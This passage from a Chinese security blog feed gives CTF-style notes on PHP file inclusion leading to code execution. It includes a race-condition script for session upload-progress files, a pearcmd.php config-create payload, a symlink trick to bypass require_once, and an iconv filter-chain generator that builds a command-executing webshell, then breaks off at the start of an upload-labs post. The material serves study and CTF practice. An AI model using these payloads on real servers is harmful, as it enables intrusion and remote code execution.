class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /web10.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1:18888</span><br><span class=\"line\">Content-Length: 426</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class=\"line\">sec-ch-ua-mobile: ?0</span><br><span class=\"line\">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://127.0.0.1:18888</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://127.0.0.1:18888/file_upload.php</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=2333333; ZDEDebuggerPresent=php,phtml,php3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123.txt&quot;</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\"></span><br><span class=\"line\">nishishabi</span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html PUBLIC </span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">提交</span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB--</span><br></pre></td></tr></table></figure>\n<p>上传后我们可以控制文件名，就是我们的 PHPSESSID，但临时文件内容是空的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221102153200577.png\" alt=\"image-20221102153200577\"></p>\n<p>可见，我在上传文件的同时，POST 了一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，其值为 bbbbbbb。（PHP_SESSION_UPLOAD_PROGRESS 是在 php.ini 里定义的 session.upload_progress.name）只要上传包里带上这个键，PHP 就会自动启用 Session，又因为我在 Cookie 中设置了 PHPSESSID=aaaaaaa，所以 Session 文件将会自动创建。</p>\n<p>但它的大小为什么是 0 呢？因为上传结束后，这个 Session 将会被自动清除（由 session.upload_progress.cleanup 定义），我们只需要条件竞争，赶在文件被清除前利用即可。</p>\n<p>通过竞争实现删除之前包含</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import io</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import threading</span><br><span class=\"line\"></span><br><span class=\"line\">sessid = &#x27;23333&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def t1(session):</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class=\"line\">        response = session.post(</span><br><span class=\"line\">            &#x27;http://127.0.0.1:18888/file_upload.php&#x27;,</span><br><span class=\"line\">            data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?=phpinfo()?&gt;&#x27;&#125;,</span><br><span class=\"line\">            files=&#123;&#x27;file&#x27;: (&#x27;a.txt&#x27;, f)&#125;,</span><br><span class=\"line\">            cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;</span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def t2(session):</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        response = session.get(f&#x27;http://192.168.1.7/xss_location/include/session_upload.php?file=C:/windows/sess_&#123;sessid&#125;&#x27;)</span><br><span class=\"line\">        print(response.text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">with requests.session() as session:</span><br><span class=\"line\">    t1 = threading.Thread(target=t1, args=(session,))</span><br><span class=\"line\">    t1.daemon = True</span><br><span class=\"line\">    t1.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    t2(session)</span><br></pre></td></tr></table></figure>\n<p><code>&lt;?=phpinfo();?&gt;</code>   可以改为写文件，在自定义的路径下写文件，然后在包含，这样无需解决路径和文件名的问题</p>\n<p>5. 通过 string.strip-tag 导致 php 崩溃</p>\n<p>在 docker 中也是可以用的，具体看上面</p>\n<p>6.pearcmd.php</p>\n<p>pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl/pear 是默认安装的；在 7.4 及以后，需要我们在编译 PHP 的时候指定 <code>--with-pear</code>  才会安装。</p>\n<p>不过，在 Docker 任意版本镜像中，pcel/pear 都会被默认安装，安装的路径在 <code>/usr/local/lib/php</code> 。</p>\n<p>Docker 环境下的 PHP 会开启 <code>register_argc_argv</code>  这个配置。当开启了这个选项，用户的输入将会被赋予给 <code>$argc</code> 、 <code>$argv</code> 、 <code>$_SERVER['argv']</code>  几个变量。</p>\n<p>这意味着，HTTP 数据包中的 query-string 会被作为 argv 的值</p>\n<p><code>[PHP 7.3.33 - phpinfo()](http://127.0.0.1:18888/phpinfo.php?uuuuuuu)</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221102164711562.png\" alt=\"image-20221102164711562\"></p>\n<p>如果 query-string 中不包含没有编码的 <code>=</code> ，且请求是 GET 或 HEAD，则 query-string 需要被作为命令行参数。</p>\n<p>PHP 现在仍然没有严格按照 RFC 来处理，即使我们传入的 query-string 包含等号，也仍会被赋值给 <code>$_SERVER['argv']</code> 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\xampp\\php&gt;php.exe pear/pearcmd.php</span><br><span class=\"line\">Commands:</span><br><span class=\"line\">build                  Build an Extension From C Source</span><br><span class=\"line\">bundle                 Unpacks a Pecl Package</span><br><span class=\"line\">channel-add            Add a Channel</span><br><span class=\"line\">channel-alias          Specify an alias to a channel name</span><br><span class=\"line\">channel-delete         Remove a Channel From the List</span><br><span class=\"line\">channel-discover       Initialize a Channel from its server</span><br><span class=\"line\">channel-info           Retrieve Information on a Channel</span><br><span class=\"line\">channel-login          Connects and authenticates to remote channel server</span><br><span class=\"line\">channel-logout         Logs out from the remote channel server</span><br><span class=\"line\">channel-update         Update an Existing Channel</span><br><span class=\"line\">clear-cache            Clear Web Services Cache</span><br><span class=\"line\">config-create          Create a Default configuration file</span><br></pre></td></tr></table></figure>\n<p>create-config 是可以创建文件的，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>\n<p>因此我们最终构造的 payload 如下 <code>GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1</code></p>\n<p>简单解释一下，这里的 config-create 会被当做命令行参数执行，执行的第一个参数是要写的文件内容，第二个参数是稳健位置，然后在通过包含即可</p>\n<p>这个好就好在，docker 下的 php 默认都是开这个选项的，而且不用时间竞争，而且路径文件名可控，即使不是 docker 下，仍可以尝试，万一人家要安装依赖没关呢</p>\n<h2 id=\"通过多级软链接绕过require_once\"><a class=\"markdownIt-Anchor\" href=\"#通过多级软链接绕过require_once\">#</a> 通过多级软链接绕过 require_once</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php require_once &#x27;/www/config.php&#x27;; // some logic here... </span><br><span class=\"line\">\t  require_once $_GET[&#x27;file&#x27;]; </span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n<p>如果我们想要读取 /www/config.php 中的文件，通常可以通过 php://filter 来读取，比如 <code>1.1.1.1/a.php?file=php://filter/read=convert.base64-encode/resource=/www/config.php</code> ，但但如果这个文件在前面已经被包含过了，则第二次包含就会失败，即使使用 php://filter 也一样。</p>\n<p>正常情况下，PHP 会将用户输入的文件名进行 resolve，转换成标准的绝对路径，这个转换的过程会将…/、./、软连接等都进行计算，得到一个最终的路径，再进行包含。每次包含都会经历这个过程，所以，只要是相同的文件，不管中间使用了…/ 进行跳转，还是使用软连接进行跳转，都逃不过最终被转换成原始路径的过程，也就绕不过 require_once。</p>\n<p>但是，如果软连接跳转的次数超过了某一个上限，Linux 的 lstat 函数就会出错，导致 PHP 计算出的绝对路径就会包含一部分软连接的路径，也就和原始路径不相同的，即可绕过 require_once 限制。</p>\n<p><code>/proc/self</code>  指向当前进程的 <code>/proc/pid/</code> ， <code>/proc/self/root/</code>  是指向 <code>/</code>  的符号链接，在 Linux 下，最常见的软连接就是 /proc/self/root，这个路径指向根目录。所以，我们可以多次使用这个路径：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">require_once &#x27;/www/config.php&#x27;;</span><br><span class=\"line\">include_once &#x27;/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/www/config.php&#x27;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"hxp-ctf\"><a class=\"markdownIt-Anchor\" href=\"#hxp-ctf\">#</a> hxp ctf</h2>\n<h3 id=\"the-end-of-lfi\"><a class=\"markdownIt-Anchor\" href=\"#the-end-of-lfi\">#</a> the end of LFI</h3>\n<p>在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE 。</p>\n<p>前置知识 0x00</p>\n<p>php://filter ，当使用 base64-decode 时，字符 &lt;、?、;、&gt;、空格等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，而合法字符将被正常解码，我们的正常字符包括 <code>A-Za-z0-9\\/\\=\\+</code> 。同时需要注意，base64 在编码的时候是四个字节为一组的，这个在上面 session 包含中有过详细解释</p>\n<p>举个师傅的例子:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a = &quot;\\x1bY\\xffQ\\xfa&quot;;              //YQ 为 a 的 base64 编码</span><br><span class=\"line\">var_dump(base64_decode($a));</span><br><span class=\"line\"></span><br><span class=\"line\">// string(1) &quot;a&quot;</span><br></pre></td></tr></table></figure>\n<p>很明显，我们的不可见字符，控制字符也被忽略了</p>\n<p><strong>因此我们可以使用 base64 先 decode 在 incode 来去除 base64 不认可的非法字符，这是我们后面做题的基础</strong></p>\n<p>前置知识 0x01 包含文件中的 php 代码</p>\n<p>假如我们有一个文件 e，文件中的内容是：PD9waHAgcGhwaW5mbygpOw==，即 <code>&lt;?php phpinfo();</code>  的 base64 编码，我们有两种方式包含：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include &quot;php://filter/convert.base64-decode/resource=./e&quot;;</span><br><span class=\"line\">include &quot;php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOw==&quot;;</span><br></pre></td></tr></table></figure>\n<p><code>include</code>  函数实际包含的是 Base64 解码后的 PHP 代码。</p>\n<p>前置知识 0x02 convert.iconv</p>\n<p>PHP Filter 当中有一种  <code>convert.iconv</code>  的 Filter ，可以用来将数据从字符集 A 转换为字符集 B ，其中这两个字符集可以从  <code>iconv -l</code>  获得，这个字符集比较长，不过也存在一些实际上是其他字符集的别名。</p>\n<p>举个例子，我们可以从 utf8 转换为 utf7 的编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$url = &quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&quot;;</span><br><span class=\"line\">echo file_get_contents($url);</span><br><span class=\"line\">// Output:</span><br><span class=\"line\">// some+ADwAPg-text</span><br></pre></td></tr></table></figure>\n<p>可以看到，我们在转换的同时成了一些其他的字符，比如 <code>+ADwAPg-</code></p>\n<p>这样结合我们的 base64 的 decode 忽略非法字符，和文件内容包含，也许可以直接转换出我们的 webshell</p>\n<p>比如我们可以通过 UTF8 转 CSISO2022KR 得到字符 C：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$url = &quot;php://filter/&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;     //我们这里简单使用 `data://` 来模拟文件内容读取。</span><br><span class=\"line\">var_dump(file_get_contents($url));</span><br><span class=\"line\"></span><br><span class=\"line\">// hexdump:</span><br><span class=\"line\">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 1b 24 29 43  |string(18) &quot;.$)C|</span><br><span class=\"line\">// 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 22 0a  |aaaaaaaaaaaaaa&quot;.|</span><br></pre></td></tr></table></figure>\n<p>而 c 之前的非法字符，我们只需要利用 decode+incode 去除即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$url = &quot;php://filter/&quot;;</span><br><span class=\"line\">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class=\"line\">$url .= &quot;|convert.base64-decode|convert.base64-encode&quot;;</span><br><span class=\"line\">$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;</span><br><span class=\"line\">var_dump(file_get_contents($url));</span><br><span class=\"line\"></span><br><span class=\"line\">// hexdump</span><br><span class=\"line\">// 00000000  73 74 72 69 6e 67 28 31  32 29 20 22 43 61 61 61  |string(12) &quot;Caaa|</span><br><span class=\"line\">// 00000010  61 61 61 61 61 61 61 61  22 0a                    |aaaaaaaa&quot;.|</span><br></pre></td></tr></table></figure>\n<p>前置知识结束，我们开始构造 payload：</p>\n<p>由于 <code>&lt;</code>  在 base64 是非法字符，我们无法直接构造 <code>&lt;?php</code>  的形式，但我们可以构造 <code>&lt;?php</code> base64 encode 过后的编码，在使用 base64decode 还原即可正常包含</p>\n<p>构造 <code>&lt;</code>  我们可以生成 PAxxxxx 的编码，解码过后我们就可以生成 &lt;，我们接下来要做的就是能找到可以通过编码转换生成我们需要的字符，但后面也可能生成垃圾字符，我们只需要 decode+incode 就可以去除</p>\n<p>我们最后的 webshell 长这样： <code>PD89YCRfR0VUWzBdYDs7Pz4=</code>  是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`$_GET[0]\\`;;?&gt;</span><br></pre></td></tr></table></figure>\n<p>编码后的结果，两个；；的原因是一个；的 base64  <code>PD89YCRfR0VUWzBdYDs/Pg==</code>  中间有个 /，通过编码转换不好找的这个字符</p>\n<p>其实我发现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`$_GET[0]`; ?&gt;</span><br></pre></td></tr></table></figure>\n<p>你也可以加个空格，这样也不会有 \\， <code>PD89YCRfR0VUWzBdYDsgPz4=</code></p>\n<p>最终我们的脚本长这样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;;</span><br><span class=\"line\">$conversions = array(</span><br><span class=\"line\">    &#x27;R&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;B&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;C&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;,</span><br><span class=\"line\">    &#x27;8&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;9&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;,</span><br><span class=\"line\">    &#x27;f&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;,</span><br><span class=\"line\">    &#x27;s&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;,</span><br><span class=\"line\">    &#x27;z&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;,</span><br><span class=\"line\">    &#x27;U&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;,</span><br><span class=\"line\">    &#x27;P&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;,</span><br><span class=\"line\">    &#x27;V&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;,</span><br><span class=\"line\">    &#x27;0&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;Y&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;W&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;d&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;D&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;7&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;4&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">$filters = &quot;convert.base64-encode|&quot;;</span><br><span class=\"line\"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class=\"line\">$filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach (str_split(strrev($base64_payload)) as $c) &#123;</span><br><span class=\"line\">    $filters .= $conversions[$c] . &quot;|&quot;;</span><br><span class=\"line\">    $filters .= &quot;convert.base64-decode|&quot;;</span><br><span class=\"line\">    $filters .= &quot;convert.base64-encode|&quot;;</span><br><span class=\"line\">    $filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$filters .= &quot;convert.base64-decode&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$final_payload = &quot;php://filter/&#123;$filters&#125;/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// echo $final_payload;</span><br><span class=\"line\">var_dump(file_get_contents($final_payload));</span><br><span class=\"line\"></span><br><span class=\"line\">// hexdump</span><br><span class=\"line\">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 3c 3f 3d 60  |string(18) &quot;&lt;?=`|</span><br><span class=\"line\">// 00000010  24 5f 47 45 54 5b 30 5d  60 3b 3b 3f 3e 18 22 0a  |$_GET[0]`;;?&gt;.&quot;.|</span><br></pre></td></tr></table></figure>\n<p><code>convert.iconv.UTF8.UTF7</code>  将等号转换为字母。之所以使用这个的原因是 exp 作者遇到过有时候等号会让  <code>convert.base64-decode</code>  过滤器解析失败的情况，可以使用 iconv 从 UTF8 转换到 UTF7 ，会把字符串中的任何等号变成一些 base64 。</p>\n<p>我们可以知道对于这种方法来说，其实文件内容并不重要，但至少得有内容，而且一般读取有内容的文件并不是大问题，所以我们可以简单尝试利用  <code>/etc/passwd</code> :</p>\n<p>后面还有一些天书一样的解释，我实在…</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM5NS8=\">https://tttang.com/archive/1395/</span></p>\n<p>还有一种神仙解法，先挖坑～</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM4NC8=\">hxp CTF 2021 - A New Novel LFI - 跳跳糖 (tttang.com)</span></p>\n<p>实话实说，都是我做不出来的解法</p>\n<p>我也就做做 16 年的 ctf 罢了</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/04/16/Upload/",
            "url": "http://example.com/2022/04/16/Upload/",
            "title": "File upload",
            "date_published": "2022-04-16T05:38:45.000Z",
            "content_html": "<h1 id=\"upload\"><a class=\"markdownIt-Anchor\" href=\"#upload\">#</a> Upload</h1>\n<blockquote>\n<p>当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被 webshell。</p>\n<p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>\n–验证文件类型、后缀名、大小；<br>\n–验证文件的上传方式；<br>\n–对文件进行一定复杂的重命名；<br>\n–不要暴露文件上传后的路径；<br>\n–等等…</p>\n</blockquote>\n<h2 id=\"upload-labs\"><a class=\"markdownIt-Anchor\" href=\"#upload-labs\">#</a> upload-labs</h2>\n<p>Pass01</p>\n<p>文件上传时先上传到临时目录，在从临时目录移动到定义的文件夹</p>\n<p>C:\\Users\\18310\\AppData\\local\\temp  -&gt;  ./uploads/xxx.php</p>\n<p>上传结束，临时文件删除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if 